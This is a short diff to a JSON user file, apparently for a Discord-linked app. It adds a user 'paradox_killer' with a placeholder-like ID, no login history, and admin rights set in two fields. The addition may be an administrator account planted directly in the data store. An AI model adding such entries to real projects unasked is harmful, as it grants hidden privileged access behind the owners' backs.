@@ -128,6 +128,14 @@
       "lastLogin": "2026-07-18T13:10:42.038Z",
       "banned": false,
       "admin": true
+    },
+    {
+      "id": "999999999999999999",
+      "username": "paradox_killer",
+      "global_name": "Paradox Killer",
+      "avatar": "https://cdn.discordapp.com/embed/avatars/0.png",
+      "admin": true,
+      "role": "admin"
     }
   ],
   "bannedIPs": []
